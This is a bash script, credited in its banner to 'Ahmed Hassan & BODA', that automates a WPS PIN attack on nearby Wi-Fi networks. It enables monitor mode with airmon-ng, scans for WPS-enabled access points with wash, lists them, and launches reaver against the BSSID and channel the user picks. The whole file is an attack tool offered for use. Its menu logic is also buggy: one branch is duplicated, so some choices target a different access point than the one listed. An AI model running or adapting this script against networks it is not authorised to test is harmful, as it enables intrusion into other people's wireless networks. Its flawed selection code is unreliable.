#!/bin/bash
normal='\e[0m'
blue='\e[1;94m'
red='\e[1;31m'
yellow='\e[1;33m'
ul='\e[1;4m'
purp='\e[1;35m'
green='\e[1;32m'
echo -e "${red}  _      ______  _____"
echo -e "${red} | | /| / / __ \/ ___/"
echo -e "${yellow} | |/ |/ / /_/ (__  )" 
echo -e "${yellow} |__/|__/ .___/____/  "
echo -e "${yellow}       /_/"
echo -e "${blue} Coded By Ahmed Hassan & BODA  "
sudo airmon-ng start wlan0 1> d.txt
rm d.txt
timeout 15 bash -c "sudo wash -i wlan0mon 1> l.txt"
echo -e "${blue} essid          : ch     :wpslock   :name"
echo -ne "${red}[1]"
cat l.txt | sed -n '9p' < l.txt
echo -ne "${red}[2]"
cat l.txt | sed -n '10p' < l.txt
echo -ne "${red}[3]"
cat l.txt | sed -n '11p' < l.txt
echo -ne "${red}[4]"
cat l.txt | sed -n '12p' < l.txt
echo -ne "${red}[5]"
cat l.txt | sed -n '13p' < l.txt
echo -ne "${red}[6]"
cat l.txt | sed -n '14p' < l.txt
echo -ne "${red}[7]"
cat l.txt | sed -n '15p' < l.txt

echo -ne "${ul} input num"
read x
if [[ $x == "1" ]]; then
  s1=$(cat l.txt | sed -n '9p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '9p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '9p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '9p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '9p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "2" ]]; then
  s1=$(cat l.txt | sed -n '10p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '10p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '10p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '10p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '10p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "3" ]]; then
  s1=$(cat l.txt | sed -n '11p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '11p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '11p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '11p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '11p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "3" ]]; then
  s1=$(cat l.txt | sed -n '12p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '12p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '12p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '12p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '12p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "4" ]]; then
  s1=$(cat l.txt | sed -n '13p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '13p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '13p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '13p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '13p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "5" ]]; then
  s1=$(cat l.txt | sed -n '14p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '14p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '14p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '14p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '14p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "6" ]]; then
  s1=$(cat l.txt | sed -n '15p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '15p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '15p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '15p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '15p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
elif [[ $x == "7" ]]; then
  s1=$(cat l.txt | sed -n '16p' < l.txt | cut -d ":" -f1)
  s2=$(cat l.txt | sed -n '16p' < l.txt | cut -d ":" -f2)
  s3=$(cat l.txt | sed -n '16p' < l.txt | cut -d ":" -f3)
  s4=$(cat l.txt | sed -n '16p' < l.txt | cut -d ":" -f4)
  s5=$(cat l.txt | sed -n '16p' < l.txt | cut -d ":" -f5)
  s=$s1:$s2:$s3:$s4:$s5
fi
echo -ne "${ul} input ch"
read y
reaver -i wlan0mon -c $y -b $s -vv
airmon-ng stop wlan0mon


